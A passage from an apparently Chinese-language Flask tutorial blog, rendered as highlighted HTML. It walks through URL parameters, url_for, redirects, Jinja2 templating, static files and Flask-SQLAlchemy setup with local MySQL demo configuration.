title="url传参数"></a>url传参数</h2><p>1.参数的作用：可以在相同的URL,但是指定不同的参数，来加载不同的数据</p><p>2.在flask中使用参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/article/&lt;id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'您请求的参数是: %s '</span>%id</span><br></pre></td></tr></table></figure><p>参数需要放在两个尖括号中</p><p>视图函数中需要放和url中的参数同名的参数</p><h2 id="反转url"><a href="#反转url" class="headerlink" title="反转url"></a>反转url</h2><p>1.什么叫做反转URL：从视图函数到url的转换叫做反转url</p><p>2.反转url的用处：</p><p>(1)在页面重定向的时候，会使用url反转</p><p>(2)在模板中，也会使用url反转</p><p>3.例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> url_for(<span class="string">'my_list'</span>)</span><br><span class="line">    <span class="keyword">print</span> url_for(<span class="string">'article'</span>,id=<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/list/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_list</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'list'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/article/&lt;id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'您请求的参数是: %s '</span>%id</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="页面跳转和重定向"><a href="#页面跳转和重定向" class="headerlink" title="页面跳转和重定向"></a>页面跳转和重定向</h2><p>1.用处：在用户访问一些需要登录的页面的时候，如果用户没有登录，那么可以让他重定向到登录页面</p><p>2.代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect,url_for</span><br><span class="line">redirect(url_for(<span class="string">'login'</span>))</span><br></pre></td></tr></table></figure><p>3.例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    login_url = url_for(<span class="string">'login'</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(login_url)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'这是首页'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'这是登录页面'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>访问127.0.0.1:5000/自动跳转到127.0.0.1:5000/login/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    login_url = url_for(<span class="string">'login'</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(login_url)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'这是首页'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'这是登录页面'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/question/&lt;is_login&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">question</span><span class="params">(is_login)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_login == <span class="string">'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">u'这是发布问答的页面'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>如果我们访问127.0.0.1:5000/question/0则自动重定向到登录页面</p><h2 id="Flask渲染jinja2模板和传参"><a href="#Flask渲染jinja2模板和传参" class="headerlink" title="Flask渲染jinja2模板和传参"></a>Flask渲染jinja2模板和传参</h2><h3 id="渲染模板"><a href="#渲染模板" class="headerlink" title="渲染模板"></a>渲染模板</h3><p>1.模板放在templates文件夹下</p><p>2.从flask中导入render_template函数</p><p>3.在视图函数中，使用render_template函数，渲染模板。注意：只需要填写模板的名字，不需要填写templates文件夹</p><h3 id="模板传参"><a href="#模板传参" class="headerlink" title="模板传参"></a>模板传参</h3><p>1.如果只有一个或者少量参数，直接在render_template函数中添加关键字就可以了</p><p>2.如果有多个参数的时候，那么可以先把所有的参数放在字典中，然后在render_template中，使用两个星号，把字典转换成关键参数传递进去，这样代码更方便管理和使用</p><p>3.在模板中，如果要使用一个变量，语法是：</p><p>例子：</p><p>index.html中内容</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>渲染模板代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">u'知了课堂'</span>,</span><br><span class="line">        <span class="string">'gender'</span>:<span class="string">u'男'</span>,</span><br><span class="line">        <span class="string">'age'</span>:<span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h2 id="模板中访问属性和字典"><a href="#模板中访问属性和字典" class="headerlink" title="模板中访问属性和字典"></a>模板中访问属性和字典</h2><p>访问模型中的属性或者是字典，可以通过的形式，或者是使用</p><p>例子：</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">这是HTML文件中出现的文字</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名:&#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>性别：&#123;&#123; gender &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄：&#123;&#123; age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>名字：&#123;&#123; person.name &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄：&#123;&#123; person.age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>百度：&#123;&#123; websites.baidu &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>谷歌：&#123;&#123; websites.google &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">        name = <span class="string">'somnus'</span></span><br><span class="line">        age = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    p = Person()</span><br><span class="line"></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'somnus'</span>,</span><br><span class="line">        <span class="string">'gender'</span>:<span class="string">u'男'</span>,</span><br><span class="line">        <span class="string">'age'</span>:<span class="number">18</span>,</span><br><span class="line">        <span class="string">'person'</span>:p,</span><br><span class="line">        <span class="string">'websites'</span>:&#123;</span><br><span class="line">            <span class="string">'baidu'</span>:<span class="string">'www.baidu.com'</span>,</span><br><span class="line">            <span class="string">'google'</span>:<span class="string">'www.google.com'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="if判断"><a href="#if判断" class="headerlink" title="if判断"></a>if判断</h2><p>1.语法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if 判断条件 %&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>2.if的使用，可以和python中相差无几</p><p>3.例子</p><p>if.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if user %&#125;</span><br><span class="line">    &lt;a href=&quot;#&quot;&gt;&#123;&#123; user.username &#125;&#125;&lt;/a&gt;</span><br><span class="line">    &lt;a href=&quot;#&quot;&gt;注销&lt;/a&gt;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    &lt;a href=&quot;#&quot;&gt;登录&lt;/a&gt;</span><br><span class="line">    &lt;a href=&quot;#&quot;&gt;注册&lt;/a&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;is_login&gt;/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(is_login)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_login == <span class="string">'1'</span>:</span><br><span class="line">        user = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'somnus'</span>,</span><br><span class="line">            <span class="string">'age'</span>:<span class="number">18</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'if.html'</span>,user=user)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'if.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h2 id="for循环遍历列表和字典"><a href="#for循环遍历列表和字典" class="headerlink" title="for循环遍历列表和字典"></a>for循环遍历列表和字典</h2><p>1.字典的遍历，语法和python一样，可以使用items(),keys(),values(),iteritems(),iterkeys(),itervalues()</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for k,v in user.items() %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; k &#125;&#125;:&#123;&#123; v &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>2.例子</p><p>for.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for k,v in user.items() %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; k &#125;&#125;:&#123;&#123; v &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    user = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'somnus'</span>,</span><br><span class="line">        <span class="string">'age'</span>:<span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'for.html'</span>,user=user)</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>3.列表的遍历：语法和python一样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for list in lists %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; website &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>1.介绍和语法：</p><p>(1)介绍：过滤器可以处理变量，把原始的变量经过处理后再展示出来</p><p>(2)语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; avatar|default(&apos;xxx&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure><p>2.default过滤器：如果当前变量不存在，这时候可以指定默认值</p><p>3.length过滤器：求列表或者字符串或者字典或者元组的长度</p><h2 id="继承和block"><a href="#继承和block" class="headerlink" title="继承和block"></a>继承和block</h2><p>1.继承的作用和语法：</p><p>(1)作用：可以把一些公共的代码放在父模板中，避免每个模板写同样的代码</p><p>(2)语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &apos;base.html&apos; %&#125;</span><br></pre></td></tr></table></figure><p>2.block实现：</p><p>(1)作用：可以让子模板实现自己的一些需求，父模板需要提前定义好</p><p>(2)注意点：子模板中的代码，必须放在block块中</p><p>3.例子</p><p>模板base.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">这是一个模板</span><br><span class="line">&#123;% block main %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继承block.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block main %&#125;</span><br><span class="line">    这是一个子模板</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h2 id="url链接"><a href="#url链接" class="headerlink" title="url链接"></a>url链接</h2><p>使用url_for(视图函数名称)可以反转成url</p><h2 id="加载静态文件"><a href="#加载静态文件" class="headerlink" title="加载静态文件"></a>加载静态文件</h2><p>1.语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for(&apos;static&apos;,filename=&apos;路径&apos;)</span><br></pre></td></tr></table></figure><p>2.静态文件，flask会从static文件夹开始寻找，所以不用再写static这个路径</p><p>3.可以加载css文件，可以加载js文件，还有image文件</p><h2 id="Mysql-python中间件安装"><a href="#Mysql-python中间件安装" class="headerlink" title="Mysql-python中间件安装"></a>Mysql-python中间件安装</h2><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="flask-sqlalchemy安装与使用"><a href="#flask-sqlalchemy安装与使用" class="headerlink" title="flask-sqlalchemy安装与使用"></a>flask-sqlalchemy安装与使用</h2><p>1.安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-sqlalchemy</span><br></pre></td></tr></table></figure><p>2.使用</p><p>(1)使用flask_sqlalchemy中的SQLAlchemy进行初始化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">db = SQLAlchemy(app)</span><br></pre></td></tr></table></figure><p>(2)设置配置信息：在config.py文件中添加以下配置信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dialect+driver://username:password@host:port/database</span></span><br><span class="line">DIALECT = <span class="string">'mysql'</span></span><br><span class="line">DRIVER = <span class="string">'mysqldb'</span></span><br><span class="line">USERNAME = <span class="string">'root'</span></span><br><span class="line">PASSWORD = <span class="string">'root'</span></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="string">'3306'</span></span><br><span class="line">DATABASE = <span class="string">'db_demo1'</span></span><br><span class="line"></span><br><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8"</span>.format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE)</span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>(3)在主app文件中，添加配置文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line">db.create_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>(4)测试有没有问题报错，如无，则成功连接</p><h2 id="使用Flask-SQLAlchemy创建模型与表的映射"><a href="#使用Flask-SQLAlchemy创建模型与表的映射" class="headerlink" title="使用Flask-SQLAlchemy创建模型与表的映射"></a>使用Flask-SQLAlchemy创建模型与表的映射</h2><p>1.模型需要继承自db.Model，然后需要映射到表中的属性，必须写成’db.Column’的数据类型</p><p>2.数据类型：db.Integer代表的是整型，db.String代表的是varchar，需要指定最长的长度，db.Text代表的是text</p><p>3.其他参数：primary_key代表的是将这个字段设置为主键，autoincrement代表的是这个主键为自增长的，nullable代表的是这个字段是否可以为空，可以将这个值设置为False，在数据库中，这个值就不能为空了</p><p>4.最后需要调用db.create_all来将模型真正创建到数据库中</p><p>例子：</p><p>config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DIALECT = <span class="string">'mysql'</span></span><br><span class="line">DRIVER = <span class="string">'mysqldb'</span></span><br><span class="line">USERNAME = <span class="string">'root'</span></span><br><span class="line">PASSWORD = <span class="string">'root'</span></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="string">'3306'</span></span><br><span class="line">DATABASE = <span class="string">'db_demo2'</span></span><br><span class="line"></span><br><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8"</span>.format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE)</span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>创建table执行的sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 